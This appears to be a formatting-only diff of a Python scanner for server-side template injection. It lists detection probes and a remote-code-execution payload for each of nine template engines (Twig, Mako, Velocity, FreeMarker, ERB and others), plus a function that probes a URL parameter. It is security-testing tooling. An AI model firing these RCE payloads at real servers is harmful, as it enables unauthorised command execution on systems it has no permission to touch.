@@ -22,59 +22,59 @@ SSTI_ENGINE_SIGNATURES: Dict[str, Dict[str, Any]] = {
         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
         "verification_regex": r"49|7777777",
         "description": "Python based template engine",
-        "rce_payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+        "rce_payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
     },
     "twig": {
         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
         "verification_regex": r"49|7777777",
         "description": "PHP based template engine",
-        "rce_payload": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+        "rce_payload": '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
     },
     "smarty": {
         "detection_payloads": ["{7*7}"],
         "verification_regex": r"49",
         "description": "PHP based template engine",
-        "rce_payload": "{system('id')}"
+        "rce_payload": "{system('id')}",
     },
     "mako": {
         "detection_payloads": ["${7*7}"],
         "verification_regex": r"49",
         "description": "Python based template engine",
-        "rce_payload": "${__import__('os').popen('id').read()}"
+        "rce_payload": "${__import__('os').popen('id').read()}",
     },
     "tornado": {
         "detection_payloads": ["{{7*7}}"],
         "verification_regex": r"49",
         "description": "Python based web framework engine",
-        "rce_payload": "{{ import os; os.popen('id').read() }}"
+        "rce_payload": "{{ import os; os.popen('id').read() }}",
     },
     "velocity": {
         "detection_payloads": ["#set($x=7*7)$x"],
         "verification_regex": r"49",
         "description": "Java based template engine",
         "rce_payload": (
-            "#set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\").getInputStream())"
+            '#set($str=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").getInputStream())'
             "#foreach($i in [1..$str.available()])$str.read()#end"
-        )
+        ),
     },
     "freemarker": {
         "detection_payloads": ["${7*7}"],
         "verification_regex": r"49",
         "description": "Java based template engine",
-        "rce_payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }"
+        "rce_payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
     },
     "erb": {
         "detection_payloads": ["<%= 7*7 %>"],
         "verification_regex": r"49",
         "description": "Ruby based template engine",
-        "rce_payload": "<%= `id` %>"
+        "rce_payload": "<%= `id` %>",
     },
     "slim": {
         "detection_payloads": ["#{7*7}"],
         "verification_regex": r"49",
         "description": "Ruby based template engine",
-        "rce_payload": "#{`id`}"
-    }
+        "rce_payload": "#{`id`}",
+    },
 }
 
 
@@ -99,25 +99,30 @@ async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) 
                             async with session.get(url, params={parameter: second_payload}, timeout=timeout) as resp2:
                                 text2 = await resp2.text()
                                 if re.search(pattern, text2):
-                                    detected_engines.append({
-                                        "engine": engine,
-                                        "description": data["description"],
-                                        "payload": payload,
-                                        "parameter": parameter
-                                    })
+                                    detected_engines.append(
+                                        {
+                                            "engine": engine,
+                                            "description": data["description"],
+                                            "payload": payload,
+                                            "parameter": parameter,
+                                        }
+                                    )
                                     break
                         else:
-                            detected_engines.append({
-                                "engine": engine,
-                                "description": data["description"],
-                                "payload": payload,
-                                "parameter": parameter
-                            })
+                            detected_engines.append(
+                                {
+                                    "engine": engine,
+                                    "description": data["description"],
+                                    "payload": payload,
+                                    "parameter": parameter,
+                                }
+                            )
                             break
             except Exception:
                 continue
 
     return detected_engines
+
 
 if __name__ == "__main__":
     # Example usage logic
